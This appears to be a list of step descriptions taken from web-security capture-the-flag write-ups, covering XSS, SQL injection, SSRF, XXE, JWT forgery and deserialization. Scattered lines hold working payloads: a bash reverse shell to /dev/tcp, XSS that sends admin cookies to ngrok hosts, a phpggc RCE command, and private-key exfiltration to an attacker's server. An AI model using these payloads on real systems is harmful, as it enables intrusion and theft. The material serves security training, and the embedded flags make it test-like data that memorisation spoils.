    "Used double URL encoding to bypass the character restriction and download the nginx.conf file successfully.",
    "Tested rendering in the browser and found an error was thrown",
    "Inside the environment file, found the flag",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt' but was denied permission",
    "Assigned the payload by sending the admin to our webpage, where we triggered 'window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=\"><svg/onload=$.globalEval(name)', <long payload>)', setting 'window.name' to '<long payload>'",
    "Checked the server response to find the flag",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Experimented with each method and found that 'POST' and 'PUT' returned a different result.",
    "Perform an SQL injection attack on the login form using a basic SQL injection payload",
    "Exploited parser differential in BeautifulSoup and injected arbitrary HTML through HTML comments",
    "Introduced additional PHP code to bypass further server checks and execute contents of another HTTP GET parameter",
    "This allows the flag to be obtained",
    "Test if the payload using 'phpinfo' page is operational.",
    "Send the generated webpage URL with the XSS payload to the 'admin bot'",
    "Access the website provided in the challenge",
    "Identified the task as a PHP Object Injection challenge",
    "Creating a JWT with 'username: admin'.",
    "Retrieve the flag from the response page",
    "Try referencing the blocked function and restricted file in the HTTP GET parameter with ?print=echo+'';print(eval('return ${blocked}[4](${nc});'))",
    "Recognized Java Serialization notation at the start of the base64 decoded string",
    "Noted the Json response and message displayed on front end upon attempted logins",
    "Zip the files into 'modified.odt' to prepare the payload",
    "Upon getting the key, encrypted `file:///var/www/html/flag.txt`.",
    "Noticed the keywords 'page' and 'upload' on the webpage sourced from the author of the CTF challenge",
    "Injected the exploit into the 'login' cookie to bypass the login process and get access to the system",
    "Exploiting the template injection vulnerability to climb the Python MRO (Method Resolution Order) hierarchy and listing all usable classes.",
    "Craft a request with LF in chunk extension",
    "Modified the given example json file by adding more semesters and setting the production value to true",
    "Discovered an API endpoint /api/users/update",
    "Found that the first of the two get requests resulted in a 400 error while the second revealed an internal web page.",
    "Accessed the 'user' directory and found an oddly-named nginx.conf file.",
    "Identified the 'GopherAdapter' code in 'modules/Gophers.py'",
    "Found out that the user input '$text' from get param 'text' was passed into 'exec' leading to potential remote code execution",
    "Observed User-Agent details and an image printed as a response to the login.",
    "Identified a `/api/token` endpoint in `LoginPage` which returns the current authentication token.",
    "Made a GET request to the /api/admin endpoint with the new JWT, received the flag: RITSEC{JWT_th1s_0ne_d0wn}.",
    "Research on vulnerabilities of Apache httpd 2.4.49 and find possible exploits",
    "We have a simple login page",
    "Visited the manipulated URL and retrieved the flag.",
    "Understood that the variable part contained the previous char of the flag, the actual char of the flag, and the index of the actual char",
    "Submit the form with any random user credentials. The website redirects to '/flag', displaying a message 'Not admin, no flag for you'",
    "Upon successful injection, the website returned an alert with the flag in it.",
    "Here we have the flag",
    "Review challenge to identify goal: in this case, the purchase of a flag with starting balance of zero",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Run a HTTP GET request with injection command which echo the FLAG environment variable",
    "Deduced that the database logic requires the token of the password for successful login",
    "Created a function `execute_command` in the Python script to run commands, increasing the command output slice index until the result was empty",
    "Found a passcode and API endpoint details in the downloaded files",
    "Intercepted the data and manipulated it using burpsuite, thus bypassing the front end input sanitization.",
    "Observe that the code is structured in such a way that it performs two DNS resolutions: the first to check if the destination is private, and the second to request the resource.",
    "Open the provided URL: https://redpwn.net/",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "If the history length is three, the balance has been exceeded. In that case, return false and the queried amount.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Manually changed the 'Link to profile' field to 'http://ourwebsite' in the first option of 'Support' section made the admin visit it and the 'User-Agent header' showed the admin uses 'Firefox 61.0'",
    "Create final payload '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img' to steal the admin's cookie and get the challenge flag",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Finally, read the flag file `cat flag.txt` and obtained the flag",
    "Notice that the challenge is about Cross-Site Scripting (XSS) on a website which allows HTML input",
    "Realized finally that both SQL statements are identical to 'SELECT username, password FROM users WHERE username='admin''",
    "Obtained the email of the target: alexo@uupeye.edu",
    "Accessed a website with a list of four different image galleries.",
    "Researched 'Code Execution through IIFE in node-serialize' advisory and what IIFE is",
    "Used a trick where angular recognizes '\\' as '/', and %-decodes strings. Matched to 'debug/answer' via a simple curl request to '/\\%64ebug/answer'.",
    "Changed the base URI of the page to attacker's own server using `<base href=//351b-42-60-216-15.ngrok.io>`.",
    "Construct payload so that it will command execution of the content of another GET parameter.",
    "Observed that the first page displayed the message 'Not authenticated'",
    "Selecting an image: 'img/paperbots.svg' provided by the server that can be used for exploiting the service.",
    "Consider the potential of exploiting the system by bloating the URL length (via the 'ids' parameter) to hit a limitation",
    "Discovered a package vulnerability in node-serialize from npm install warnings and checking npm audit",
    "Created an SQL query that returns a 'valid' result set with 'email' and 'password' columns to bypass the authentication check",
    "Realize that, due to limitations on the maximum attempts from the same IP address before a reset, the IP address used to generate the token cannot be used to extract it",
    "Extracted the challenge flag from the server response after successful SQL injection.",
    "Both 'profile.php' and 'manage.php' are protected by a 'hidden token', these tokens are associated with the current session",
    "Send second POST request to /feed.php with XML code designed to expose flag file from current working directory.",
    "Inferred the username to be michelle from the code",
    "In the second function, verifyPassword(), the code showed that a bcrypt password verification is used.",
    "Notice that to match the value of 'hash' and 'target', the 'hash' param cannot equal '10932435112'",
    "Created another loop in the Python script to compose the flag",
    "Waitress sees both received requests",
    "With this payload, the flag was successfully captured",
    "Identified the challenge as a NoSQL Injection task",
    "Notice the 'Server' header in HTTP response - application is behind AWS ELB and likely AWS WAF.",
    "Review the challenge description again and shift focus to the 'following' feature",
    "Analyzed 'http://35.207.189.79/pyserver/server.py' to find that the code seems to have a vulnerable functionality that doesn't sanitize query parameters properly",
    "Examined the source code of the challenge present in the cloned repository, discovered a Dockerfile",
    "Create a Python script to generate URLs that set cookies with parts of manipulated JavaScript code.",
    "The flag was output as a result of executing the attack.",
    "Receive a response that contains data from the /etc/passwd file, indicating successful exploitation of an XXE vulnerability",
    "Identified a 'genflag' server intended for Server Side Request Forgery (SSRF).",
    "Identified the need to perform an XSS attack, but noted that a Content Security Policy (CSP) was in place to prevent this.",
    "Checked the docker configuration file for additional information",
    "Did a NIKTO scan on the target using the command: nikto -h http://172.17.15.117:443/",
    "Identified that the challenge is written using the mermaid library",
    "Retrieve the flag: flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}.",
    "Visited http://easy-php.darkarmy.xyz/robots.txt and discovered '?lmao'",
    "Deduced that the suffix of 'c1' and 'cp1' are same, so they probably contain information about the product name and the purchase status.",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Identified some extra code for the debug mode in the bookhub/views/user.py file",
    "Opened http://18.213.16.123:5000/ and found out the web app run in the debug mode",
    "The shellcode was created and verified with no NULL bytes, to operate as expected with the `strlen()` function of the 'shellme()' function inside the `shellme.so` file",
    "Analysed the HTML code revealing the CAPTCHA checkbox which generates random string.",
    "Connect to https://web5.ctfsecurinets.com/flags.php",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Receive the request and observe the flag in the request header",
    "Noted that when the admin's hash is used, the /api/create handler does not sanitize data. Hence, XSS payload is generated by sending a POST request to /api/create",
    "Analyzed the provided PCAP file and identified a packet (#6) that points to a different URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Discover the security question answer from one of the images",
    "If we remove the 'name' key value pair from JSON body we can see the following error",
    "Decided to use a UNION SELECT based query to obtain information from MySQL special tables",
    "Identified the service as the app mentioned in the challenge.",
    "Understand that an XSS must be achieved within the 'localhost:3000' origin that allows for usage of the 'localhost:3000/render?url=' feature in order to avoid the same-origin policy and read the flag",
    "Identified that three successful purchases of 'cheap' gave the same prefix and the prefix changed in unsuccessful purchase.",
    "Tried using the 'UNION' clause in the SQL injection to search for the 'flagman69' user",
    "Understand that the mysqljs/mysql package is used without the option stringifyObjects: true",
    "Identified an admin bot script that the challenge provided",
    "Triggered a JavaScript debugger inside the web-browser's developer tools",
    "Visited the reported portion of the JavaScript file",
    "Identified a scoped style attribute and a `navigator.battery.charging call` in the JavaScript",
    "Noticed URL Capture and Admin buttons on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "Sent the command 'SET <userID>_isAdmin \"yes\"' to set the <userID>_isAdmin value to 'yes'",
    "Submitted this payload to the meme generator",
    "Overwrote document.domain using Object.defineProperty(document, 'domain', {value: 'yeunote.ctf.yeuchimse.com'});",
    "Modify the `ApiMapper` to fetch the admins token on GET request to the specified `apiGet` URL.",
    "Send the payload",
    "Output the character if it returns a count larger than 0",
    "Checked the network tab and noticed a graphql endpoint",
    "Devise the exploit to upload enough bytes to exceed 10 records, hence causing the checkpoint action to be executed.",
    "Add two A records to the DNS entry in an attempt to bypass this double-check, by first resolving to 127.0.0.1 (a local IP) and then to 51.38.138.162 (an IP address of a server).",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Noticed that the URL changes when querying any other galleries.",
    "For the second flag, analyzed server-side JavaScript handling requests to '/api/true-answer', which only responded with the flag if the request came from the loopback network",
    "Parsed the challenge PHP source code, noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function",
    "Since we knew the flag was found in the root directory and its name, executed 'php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system \"cat /flagM1AhS\"'",
    "Checked each profile for potential flags",
    "Recreated the scenario where 'name' variable is never redeclared by using '?length=' as the query string which ensures 'usernameLength' is empty",
    "Opened the app's login page and noticed an option to register a new account",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Decided to find a paper that was not published",
    "Perform a CSRF to the /find endpoint to retrieve the flag and make a callback to our server with the data.",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Reading the window variable using JavaScript to find admin cookie: `var name = Object.getOwnPropertyNames(window).filter(x=>x.indexOf('admin')!=-1)[0];`",
    "Use Postman, or a similar tool, to send requests with the new 'Admin' JWT token to update the user role and access the flag.",
    "At the same time, relative JMPs were turned into PLT type trampolines to avoid big JMPs with null bytes-NOP Sled to gracefully handle oversized jumps",
    "Tests the SSTI vulnerability by inputting a mathematical operation as the payload into the password field making the server return the result of the operation.",
    "Experiment with the '/getFile?file=...' route, e.g., by replacing 'admins' with '.env' or '../.env'.",
    "Found a mechanism to fetch the poll options and exfiltrate them to `example.com` in the button `onPressed` event handler `api_post`.",
    "Attempted payload to inject XSS via `theme` failed due to Content Security Policy",
    "Observed the blog and identified that the owner is a fan of Canonical and its product, Bazaar.",
    "Used `1'; SHOW DATABASES;` to reveal the names of active databases.",
    "Find two scripts, 'changelog.js' and 'update-dist-tags.js' using 'child_process'.",
    "Decode the Flask session cookie by extracting the text before the period (.), adding padding, and applying Base64 decoding.",
    "Upload the manipulated image file to the web application",
    "Appended unique transmission values to a list",
    "On the mfa service, this userdata was included as a request parameter.",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory",
    "Used these cookies to visit 'private.php' and obtain the flag.",
    "Checked the related details on a popular vulnerability database, https://www.exploit-db.com/exploits/50383",
    "After start of the instance, the site provides a link to the running instance",
    "Chose two small-sized PDFs due to size restrictions.",
    "The challenge offered a shared object entitled `shellme.so` and a website",
    "Attempted user enumeration by utilizing two accounts",
    "Created a payload to leak cookies to the server by utilizing the mutation found earlier.",
    "Used the public endpoint given by `ngrok` to catch the reverse shell and retrieved the flag",
    "Note that when an array is passed in 'file' GET parameter, it gets converted and concatenated into a string with comma separation for each element. This also passes the filename restrictions",
    "Decoded the base64 encoded payload to find PHP script",
    "Viewed the page source",
    "Observed that global scope is the window object in HTML and 'name' variable refers to 'window.name' which can be controlled when new window is opened",
    "Test the vulnerability with a payload consisting of a special SQL statement",
    "Research methods of bypassing this kind of checks due to restrictive checks.",
    "Included 'credentials: include' to ensure same-origin policy wouldn't block the request",
    "Starting point of the code, it's a SQL Injection attack and for domain they used a combination of uppercase, lowercase, numbers, underscore and curly braces",
    "Read an interesting binary '/readflag' using 'cat' command.",
    "Identify that the <script>alert('pwned')</script> won't be executed because of the DOMValidator.js script",
    "Duplicated the server environment and set up a redis server to construct an exploit",
    "Exported '/tmp' to the PATH to ensure the shell would execute the malicious 'id'",
    "Started the CTF challenge with a note stating 'under protection' indicating the platform has some security measures",
    "Finally, we log in using the newly changed credentials pertaining to the admin account and retrieve the flag.",
    "The script loops through a range of integers, replacing each into a URL and calling the web page",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "The code must contain only lowercase letters, parentheses and periods",
    "The server recognized the signature and provided the flag",
    "Discovered a PHP form for var1 and var2 which, on submission, made a GET request to /save.php and populated an entry in /out/save.txt.",
    "Noticed an error in the above case, indicating the presence of an unclosed apostrophe",
    "Analyze the Python code, noting that it ignores the first letter if it's uppercase and establishes a pattern based on this",
    "Identified in hindsight an alternate solution to bypass the login via the username field using SQL injection",
    "Suspected a reverse proxy might be stripping the X-Forwarded-For header",
    "Understand that any other sha1 hash starting with the same prefix will match the target due to type juggling",
    "Did a nmap scan on IP 18.213.16.123 which was not a local IP",
    "Devising a payload that can bypass the bracket-based sanitization by adding an extra '>' in the start. This exploits the arbitrary JavaScript execution via a broken image tag's onerror handler",
    "Identify that to exploit RCE, payload needs to be signed with a valid signature which can be obtained from .env file",
    "Recognized this configuration grants access to any file on the filesystem",
    "Realized that by POST-ing certain data (including `constructor/prototype/offline`), every object will now have the `offline` attribute",
    "Used the acquired financial resources to buy the flag.",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}",
    "The error message then indicated a missing token, scoured the page source and Javascript files to locate the token",
    "Note that the const 'note' can be altered by closing the string and inserting arbitrary JavaScript",
    "Verified the final PDFs using the 'mutool info -X' command.",
    "Checked the parent directory with 'ls ../' and found 'flag.txt'",
    "Identified potential for serious exploits like RCE due to the presence of prototype injection vulnerability in server-side code",
    "Set up a listening server using 'netcat'",
    "Sends the payload via POST request and check if 'True' is in the response. If 'True' is present, the flag string character is an actual flag character; that character is then appended to the flag.",
    "Access the initial webpage, which shows a PHP snippet",
    "Searched for the flag using 'ls /' which revealed a 'flag.txt' file.",
    "Authenticate as a user by exploiting the fact that the MessageDigest object's digest() function is called twice when logging is enabled, effectively calculating the SHA-1 hash of an empty string. Using the known hash of an empty string as a token value results in successful authentication.",
    "Find a way around the lack of access to the constructor property by using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Utilized the un-blacklisted linux redirection character '<' to read the flag with '< ../flag.txt'",
    "Accessed a users.php page after logging in as the admin which contains usernames and card numbers.",
    "Found and retrieved the flag: flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}",
    "Found potential Server-Side Template Injection (SSTI) vulnerability in 'challenge/routes/index.js' and 'challenge/helpers/CardHelper.js'.",
    "The retrieved data was found to be structures containing all the RGB values for pixels",
    "Implement knowledge from research to craft a payload that will bypass the checks using bitwise XOR operation in PHP.",
    "Found the server endpoint was also vulnerable to Server-Side Template Injection (SSTI).",
    "Confirmed vulnerability by uploading another LaTeX document, this time a script to alert the document's cookies",
    "Used a JavaScript console in the web browser to decode the ASCII to a readable text which gave the flag",
    "Opened the CTF challenge and read the initial text",
    "Writing, compiling and giving SUID and SGID permissions to a binary that sets the effective user and group IDs to that of the SUID and SGID permissions",
    "Analyzed the Tomcat log found in the S3 bucket, which revealed another flag and a GitHub repository",
    "Identified unique JavaScript with nextExport, autoExport and buildId attributes",
    "Leverage that 'Buffer' stops when it encounters the first non-hexadecimal character",
    "Received a message from the '/vim/quit/' endpoint that suggested using a query parameter.",
    "Use the /find endpoint to encode the cookie-characters as response headers.",
    "Crafted a correct value for the cookie: {\"hash\": \"T35T\"}",
    "Inspected the 'flag.php' file and its history but found no relevant information",
    "Analyzed the source codes provided and determined that the webpage is created by either executing an eval from a payload query parameter or calling the directory() function with specific parameters",
    "Used the PHP serialize() function to serialize the custom 'Login' object",
    "Found that the preview feature on the right side is an iframe of /demo",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Inspect the Beego source code to find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Send POST requests to upload both these files.",
    "Understand that due to the parameter being reflected in the response, the system may be susceptible to XXE attacks",
    "Analyzed the secure portal page source",
    "Use curl command to navigate subdirectories and exploit Apache vulnerabilities to access the desired file",
    "Decoded the Base64 cookie value to reveal the flag",
    "Sent an HTTP POST request to utilize the code snippet via the /cow_designer page to list the directory content. Discovered files in the directory, including the 'flag' file, amongst others.",
    "Retrieved table names from the database by manipulating the SQL query using 'moneys=' parameter",
    "Use an empty username and arbitrary password to exploit the vulnerability and log in to the system.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Identify that the 'secret key' is '1234', which yields information for encoding and decoding JWT tokens.",
    "Sent a POST request with 'launch' attribute set to true",
    "Note that the code introduced a problem when attempting to add to an immutable namedtuple, which raises an AttributeError when performing the assignment.",
    "Identification of a voting procedure challenge that requires solving. A string has to be found so that the MD5 hash of this string exactly matches the challenge.",
    "Decoded the base64 encoded flag from the cookies received",
    "Connected to http://ctfchallenges.ritsec.club:3000, received a message that this page is for authentication with an API located at port 4000.",
    "Once the website parses the XML and evaluates the 'xxe' entity, it will display the content of the '/flag.txt' file",
    "Access the website homepage which contains a login form",
    "In the source code, observed that 'shell_exec' is used to run the 'santa_mon.sh' script. Our input in the 'command' URL parameter is then appended to '/santa_mon.sh' so that the final command looks like '/santa_mon.sh [COMMAND PARAMETER INPUT]'. Noted that the 'sanitize' function is called on our input, which removes spaces.",
    "Identified a user profile with list of created books hosted on the server",
    "Got two different URL encoded strings with the same md5 hash",
    "Claimed Free Flag",
    "Use the site\u2019s JavaScript to generate the 'key_id'",
    "Injected the 'id' command in the input box to find out user and read permissions",
    "Identify that eval() function is vulnerable and can be used to execute shell commands from within Python",
    "Make a request to the Go microservice using a POST method with a '_method=PUT' query to reach the 'Put()' handler",
    "Tried to spawn a reverse shell with '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #'",
    "Connect to given website link (http://3.112.91.135/)",
    "Created a paste with multiple script tags each having different nonce",
    "Register a user account on the website",
    "Set a for loop to iterate a get request to 'https://shiba.yactf.ru/api/boop' through the established session 1500 times",
    "Located an exploit script provided in the GitHub issue.",
    "Executing this script provides the CTF flag hidden by the server on a specific 'likeCookie' value.",
    "Moved into burp suite and logged in to investigate any intermediate requests",
    "Discovered the server was powered by PHP",
    "Executed the new URL, resulting in a base64-encoded result.",
    "Identified the challenge as a Server Side Request Forgery (SSRF) issue, with the vulnerable parameter being 'galleryUrl'",
    "Visited the targeted website, which contained a PHP eval function.",
    "Uploaded a LaTeX document containing a script for a basic alert as a proof-of-concept for XSS vulnerability",
    "verifyMFA() function appeared to check a 10 digit random number.",
    "Inside the PHP environment file, located one more environment: /secret_ctf_location/env",
    "Used the remote code execution to download the flag",
    "Research if it is possible to bypass the 'ereg' instruction by injecting a NULL byte",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Identified that in the php code, there were serialization in the __construct and __destruct methods.",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/. Observed an SQL query at the start of the HTML page returned, attributing the user's IP address to an SQL query, indicating possible SQL injection vulnerability.",
    "Opened the provided URL which returned a page that accepts another URL and submits it.",
    "Send a GET request to 'outer.html' with the custom host header targeting your own host",
    "Uploaded the first PDF and used the website to sign it",
    "Notice that the website is about cookies based on presented information",
    "In between each iteration, the script pauses for a random interval between 1 to 4 seconds",
    "Attempt to navigate to /admin.phps, gets a 'Not Found' error",
    "Fetch the missing git objects from the server",
    "Retrieve source files for AsmBB and FreshLib using wget, validate the files with SHA256 sums, and unpack the tar archives",
    "Remove unwanted characters from the decoded message and extract the final flag.",
    "Ensured that the 'file_get_contents' instruction would perform an HTTP GET call to the backend endpoint '$BACKEND/get/5779715767432985082/../../admin'.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Noticed the cookies being set at every stage of authentication",
    "Realize that a hidden sheet's full range can be accessed by just typing its name",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root",
    "Strategy to attack endpoint determined: read another HTTP GET parameter (non-alphanumeric).",
    "Read the given challenge which involves investigating an unintentionally exposed internal API and finding a flag",
    "Discovered a bug in the /admin/system/refresh_session/ endpoint which could be accessed without authentication",
    "Found a section in DOMPurify's unit tests where they tested payloads that can cause XSS if used with jQuery's html() method",
    "Included 'Content-Type: application/json' in the request header and 'otp' and 'secretId' in the request body",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable, which is used in sending activation emails as an argument to Exec2 routine, indicating that Remote Code Execution (RCE) could be possible",
    "Observed that obtaining the flag message requires waiting for a response from the server after each vote.",
    "Import the md5 function from hashlib in Python.",
    "Examined the different database schemas and tables: accounts, config, env, innodb, sys, users",
    "Programmed the server for the second response to redirect to 'http://localhost/flag' to obtain the flag.",
    "Reveal the source code of both `index.php` and `getimg.php`",
    "Consider another solution of predicting the random numbers generated since they are not cryptographically secure.",
    "Use the identified class to list directory content remotely",
    "After running the script, find the secret key is 'butter'.",
    "Tried to bruteforce the admin portal without success",
    "Identified privileged permissions to create and invoke AWS Lambda functions",
    "Received a collection of CSV files containing network traffic data and a shapefile with information about cameras in Singapore",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Used dumper from GitTools to inspect the git repo since directory wasn't directly browsable or clonable",
    "via XHR, sent a request to update the password",
    "Realized needed to request 'http://genflag/flag' from 'website' using '/home/stypr/readflag' on that same 'website'.",
    "Registration process was completed in the system",
    "Interpret challenge hint and guess that language setting may be relevant to solve puzzle",
    "Used python3 jwt_tool.py to perform the RS256-to-HS256 exploit.",
    "Noted that admin reads these HTML files",
    "Accessed the webpage which has an interface to a router with a ping functionality.",
    "Obtained the real flag within the FLAG cookie",
    "Encode the string into bytes and hash it using md5.",
    "Reload the page to freeze the flag animation",
    "Downloaded the source.zip file and opened it to find upload.php, which is the relevant code.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "The challenge is to change the admin's password, which surprisingly can be passed as a URL parameter.",
    "Accessed challenge PHP URL and reviewed presented source code",
    "Crafted and injected a record by passing a password with a ':' character to bypass the 'false' value, thus creating an admin account",
    "Swapped the JWT token with the admin token in the browser's developer tools to gain admin access.",
    "Found a 'flag.txt' file in the 'flag_is_here' directory",
    "Found a command to a netcat session",
    "Compiled a list of emails to attempt password brute force",
    "Confirmed the use of SQLite version 3.22.0",
    "Read the contents of 'flag.txt' by using the command 'cat /flag.txt' as part of the URL parameter.",
    "Infer that the flag is inside a `flag.txt`, needing to bypass filename restrictions to get it",
    "Change the server to the testing server",
    "Perform a GET-based CSRF through a top-level navigation to set the authentication cookie for the victim using JavaScript, followed by a 'sleep' for 1 second to ensure the navigation completion and cookie placement",
    "Activate accessibility tools in the Tools section to unhide hidden sheets",
    "Use command: 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Apply the same process to the challenge's 'nonce' value",
    "Searched for a checked checkbox for 'flag{' and found the flag in the response section of that response.",
    "Demo the reliability of this solution by using the DEMO application provided by singularity, replacing the RANDOM placeholder in the URL with something random.",
    "Observe the configuration file of the Traefik service, note that it acts as a reverse proxy for the Go microservice, and only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "If the response contains the 'check' string, that means the guess was correct and the character is appended to the 'flag' and the process continues",
    "The URL specified in the 'background' of the appropriate CSS rule is only fetched if the 'data-last' attribute starts with the correct string.",
    "Finding the flag in a file named 'flag.txt'.",
    "Reviewed the problem statement and noticed that the target application had a dependency on 'jsonwebtoken' 3.2.2",
    "Register a user and analyze the cookies to find the `login` cookie with base64 content",
    "Obtained the flag: 'JCTF{spoooooky_ghosts_in_storage}'",
    "Consider potential SSRF/file inclusion vectors",
    "Run script: Run your script and watch for the flag in the script's output",
    "Concluded that a JWT confusion attack is needed, which involves changing the `Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm`.",
    "Visit the robots.txt page for the site and find a message about using an unsupported browser, more specifically Internet Explorer 6.01",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Host own server to capture the request, including the Admin-Key",
    "Examined the index.php and found a comment detailing an admin console at http://172.16.2.155.",
    "From the code snippet, learn that the tripcode is a part of an encrypted string composed of remote IP address, a seed (IDSEED), and current date",
    "Obtained the admin's cookie to retrieve the flag",
    "Use the flag variable to denote a successful guess. If a guess was successful, restart the loop to guess the next character.",
    "Used AWS CLI to access and download files from the 'palindromecloudynekos' S3 bucket",
    "The first function, verifyUsername(), was just a simple string comparison, indicating that the correct username was 'D0loresH4ze'.",
    "Met the condition in the JavaScript code by running a payload such that it equals 1337",
    "Changed session username to 'root' using client-side cookies",
    "Understand that the customer eligibility to purchase exclusive items on the API depends on their fame and the sum of their point history.",
    "Command executed successfully, leading to the conclusion that the problem might have been misconfigured.",
    "Decode the cookie using base64 decoding",
    "Understand that ATS processes LF as line endings (instead of CRLF), while Waitress allows LF in chunked extensions",
    "The site's Content-Security-Policy (CSP) allowed stylesheets to be loaded from '*.jsapi.tech', enabling the loading of a CSS file from the exploit domain.",
    "Found out Angular, while performing HTTP requests, uses a Host header - 'PROTOCOL + HOST + / PATH' - and also follows redirects",
    "Study the provided Python script and identify that the program attempts to validate IP addresses and checks if IP matches certain values to confirm its a valid non-private IP",
    "Understand how server processes the JWT. Take note that the public key, verifyKey, is used to validate JWT signature in both HS256 and RS256 cases",
    "Register as a new user on the API.",
    "Accessed the Favicon of the webpage and found some encoded payload",
    "Gained access to '/cornelia' URL which performs GET request on chosen URL",
    "Accessed and analyzed the code of the Cowsay as a Service Challenge",
    "Configured the server to give two different responses, the first passes the SSRF check.",
    "Try to access `http://3.91.17.218/.git/` but encounter HTTP `403 Forbidden` response",
    "Inserted the payload into the target site's URL",
    "Identified that the 'openssl_verify' is the function used to sign the PDF files",
    "Wrote a Python script to retrieve all characters and compose the flag",
    "Identified an alternative approach to bypass authentication using the password field",
    "Observed the process of function calls within the JavaScript code",
    "Identify a potential vulnerability in the 'query_login_attempt' function.",
    "Checked the forgot password feature, which revealed a snippet of JavaScript code containing database credentials and a 'JSESSIONID' cookie",
    "Research potential vulnerabilities of LibreOffice tool",
    "Use the 'cat' command to display the contents of youfoundme-asd897kjm.txt",
    "Access website, identify cookie related to flavor",
    "Visited the challenge webpage and checked the webpage source",
    "A Python script was written to automate the process and test the different values for 'likeCookie' by making HTTP GET requests. The script uses the 'requests' library to send HTTP requests, and a for loop was used to iterate through the numbers from 1 to 20.",
    "Assess remote code execution isn't possible.",
    "Checked the filter page for clues or information",
    "Found that the 'DB_SECRET' which holds the flag is stored in another table by examining the 'init_db' function",
    "Crafted serialized input to pass via 'id' HTTP GET parameter through certain PHP code",
    "The homepage is a result of an initial HTTP GET request to '/books.php?type=list'.",
    "Realized the asserts in 'index.php' were in strings, indicating potential 'eval' being done on the string",
    "Discovered 'manage.php' page with dirbuster, this page is the admin's tool for changing 'user status' to 'premium'",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability",
    "Saw the criteria for getting the flag printed",
    "Understood that trim(string, character) will remove `character` from `string`. Therefore, ' AND password=' is treated as a string and hence, ignored",
    "Set 'flagConverted' on the previously set sessionID, causing the promise to resolve",
    "Examine the `User` object and identify that it instantiates a `SQL` object.",
    "Rewrite the returned JavaScript code in a more readable format",
    "Manipulated the JavaScript by intercepting the Post Request and replaced the email value with a controlled one, keeping the known username ('true.grit@umbccd.io') intact.",
    "Connecting to 'scriptlet' endpoint reveals it's running as 'www-data'",
    "Created 'merged.pdf' containing a dummy PDF and the chosen input PDFs.",
    "Enumerated the columns of the user table by passing a SQL command into the X-FORWARDED-FOR header.",
    "Passed the newly edited admin jwt token to the /flag endpoint",
    "Understood that the default signature algorithm for the openssl_verify function is SHA1, which has been broken for PDFs",
    "Uploaded a different file to observe the changes in the content",
    "Set a breakpoint in the JavaScript file",
    "Analyze the HTML of the page to discover a JavaScript script",
    "Copied the introspection query and pasted it into BurpSuite in order to send it to the graphql endpoint",
    "Identify possible XSS vulnerability due to challenge title",
    "Analyze the given Python script and identify its structure and functionality",
    "Identify the need for an 'Authorization' header containing a JWT.",
    "Checked the version numbers of these libraries and searched for security vulnerabilities without any results.",
    "Visited the challenge website and tried to understand how it works",
    "Opened the link provided in the CTF challenge - http://138.247.13.111",
    "Created a new GitHub Pages site with a subdomain that matched the target domain",
    "Downloaded and analyzed website source code",
    "Discover an article by PortSwigger about using the CASE clause to determine the column of the result being sorted.",
    "Access the provided URL",
    "Examine main web page source code, find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`",
    "Used btoa javascript function to base64 encode the private key for safe transmission in an HTTP GET request to the attacker's server.",
    "Search the challenge description online, finding a quote from Mr. Robot that signifies checking out the website's 'robots.txt'",
    "By knowing the secret, now able to send a request directly to the backend server",
    "Counted the number of cameras within a 1.3km radius of the point of interest by looping through each camera location in the shapefile and checking if it's within the specified distance using the haversine formula",
    "Discover that the Express application is put behind a reverse proxy (Apache Traffic Server)",
    "Connect to website and analyze HTML which results in a link to the source code",
    "Accessed the website http://35.207.120.163 from the challenge.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Attempt to change status to 'premium' resulted in 'Permission Denied!' message",
